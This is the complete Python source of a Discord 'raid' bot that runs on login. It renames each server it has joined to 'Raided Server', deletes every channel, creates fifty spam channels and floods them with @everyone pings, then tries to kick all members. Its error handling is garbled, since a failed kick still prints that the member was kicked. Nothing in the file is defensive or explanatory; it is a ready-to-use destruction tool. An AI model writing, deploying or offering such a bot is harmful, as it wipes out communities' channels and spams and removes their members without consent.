import discord
from discord.ext import commands
import asyncio
from keep_alive import keep_alive
import time

keep_alive()

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')
    print('bot is ready')
    for guild in bot.guilds:
        await guild.edit(name='Raided Server') # Renames the guild to "Raided Server"
        print('renamed server Raided Server')
        for channel in guild.channels:
            await channel.delete()
        print('deleted channels')
        print('Creating channels...')
        channels = []
        for i in range(50):
            channel = await guild.create_text_channel(f'raided-by-x-{i+1}')
            channels.append(channel)
        print('Sending messages...')
        for i in range(10):
            for channel in channels:
                await channel.send('@everyone')
    
    for guild in bot.guilds:
        for member in guild.members:
            try:
                await member.kick()
            except discord.Forbidden:
                print(f"{member.name} has been kicked from {guild.name}")
            else:
                print(f"{member.name} has been kicked from {guild.name}")
print('Done')
    
bot.run('Bot token here')
